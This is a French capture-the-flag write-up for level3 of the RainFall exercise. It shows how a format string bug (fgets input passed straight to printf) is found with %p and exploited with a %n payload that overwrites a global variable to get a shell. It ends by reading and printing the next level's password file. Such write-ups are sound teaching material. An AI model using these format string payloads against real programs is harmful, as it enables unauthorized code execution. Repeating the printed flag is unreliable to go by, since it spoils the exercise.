Nous remarquons que le programme utilise un fgets, puis met la sortie de fgets en premier argument du printf, ce qui est une faille de sécurité. Nous pouvons mettre une valeur de notre choix à certaines adresses, grâce à l'utilisation du flag %n.

L'assembleur nous montre une comparaison entre 64 et la variable global à l'adresse `0x804988c`, si la comparaison réussi l'on peut acceder au shell.

```asm
 80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax
 80484df:	83 f8 40             	cmp    $0x40,%eax
```

Nous recherchons l'adresse de début du buffer à l'aide de printf.

```bash
level3@RainFall:~$ ./level3 
aaaa%p.%p.%p.%p
aaaa0x200.0xb7fd1ac0.0xb7ff37d0.0x61616161
```

Ensuite, il nous suffit de stipuler l'adresse de la variable que l'on veut modifier, ainsi que son offset dans la stack et on remplit de 64 charactères le buffer afin de placer la valeur de 64 dans la variable globale.

```bash
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08%60x%4$n"';cat) | ./level3 
��                                                         200
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
